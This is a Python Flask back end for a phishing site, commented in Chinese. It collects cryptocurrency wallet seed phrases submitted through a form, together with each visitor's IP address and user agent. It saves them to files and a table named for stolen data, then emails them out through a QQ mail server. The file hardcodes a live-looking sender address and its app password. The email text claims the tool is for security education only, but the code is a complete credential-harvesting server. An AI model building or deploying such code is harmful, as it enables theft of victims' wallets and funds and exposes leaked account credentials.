from flask import Flask, request, render_template
import json
import sqlite3
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)

# =========================================================
# 🔧 邮箱配置
# =========================================================

EMAIL_SENDER = '79520128@qq.com'
EMAIL_PASSWORD = 'kzhkbmrjeliabgjb'
EMAIL_RECEIVER = '79520128@qq.com'

# =========================================================
# 📁 数据存储路径（Cloudflare Workers 临时目录）
# =========================================================

DATA_DIR = '/tmp'
DB_PATH = os.path.join(DATA_DIR, 'phishing_data.db')
JSON_PATH = os.path.join(DATA_DIR, 'stolen_data.json')

# =========================================================
# 🏠 首页 - 显示 HTML 页面
# =========================================================

@app.route('/')
def index():
    print("✅ 首页被访问")
    return render_template('index.html')

# =========================================================
# 📩 接收 POST 数据
# =========================================================

@app.route('/', methods=['POST'])
def handle_post():
    print("=" * 60)
    print("📩 收到 POST 请求")
    
    words = request.form.get('words', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f"📝 助记词: {words}")
    print(f"🌐 IP: {ip}")
    print(f"🖥️ User-Agent: {user_agent}")
    print("=" * 60)
    
    # 保存到文件
    save_to_file(words, ip, user_agent)
    
    # 保存到数据库
    save_to_db(words, ip, user_agent)
    
    # 发送邮件
    send_email(words, ip, user_agent)
    
    return render_template('index.html')

# =========================================================
# 💾 保存到文件
# =========================================================

def save_to_file(words, ip, user_agent):
    try:
        with open(JSON_PATH, 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = []
    
    data.append({
        'timestamp': datetime.now().isoformat(),
        'words': words,
        'ip': ip,
        'user_agent': user_agent
    })
    
    with open(JSON_PATH, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"💾 数据已保存到文件，共 {len(data)} 条记录")

# =========================================================
# 🗄️ 保存到 SQLite 数据库
# =========================================================

def save_to_db(words, ip, user_agent):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stolen_phrases (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                words TEXT,
                ip TEXT,
                user_agent TEXT,
                status TEXT DEFAULT 'new'
            )
        ''')
        
        cursor.execute('''
            INSERT INTO stolen_phrases (timestamp, words, ip, user_agent)
            VALUES (?, ?, ?, ?)
        ''', (datetime.now().isoformat(), words, ip, user_agent))
        
        conn.commit()
        print(f"💾 数据已存入数据库，ID: {cursor.lastrowid}")
    except Exception as e:
        print(f"❌ 数据库错误: {e}")
    finally:
        conn.close()

# =========================================================
# 📧 发送邮件
# =========================================================

def send_email(words, ip, user_agent):
    print("=" * 60)
    print("📧 开始发送邮件...")
    print(f"📧 发件人: {EMAIL_SENDER}")
    print(f"📧 收件人: {EMAIL_RECEIVER}")
    
    subject = f'Phishing Demo - Words Captured - {datetime.now().strftime("%Y-%m-%d %H:%M")}'
    
    body = f"""
    🎣 新数据捕获！

    📝 助记词: {words}
    🌐 IP: {ip}
    🖥️ User-Agent: {user_agent}
    🕐 时间: {datetime.now().isoformat()}

    ----------------------------------------
    ⚠️ 此邮件由本地测试服务器发送，仅用于安全教育。
    """
    
    msg = MIMEMultipart()
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        # 连接 QQ 邮箱 SMTP 服务器
        print("📧 正在连接 SMTP 服务器...")
        server = smtplib.SMTP('smtp.qq.com', 587)
        server.starttls()
        print("📧 正在登录...")
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        print("📧 登录成功")
        server.send_message(msg)
        server.quit()
        print(f"✅ 邮件已发送到 {EMAIL_RECEIVER}")
        print("=" * 60)
    except Exception as e:
        print(f"❌ 邮件发送失败: {e}")
        print("=" * 60)

# =========================================================
# 🚀 启动应用
# =========================================================

if __name__ == '__main__':
    app.run()
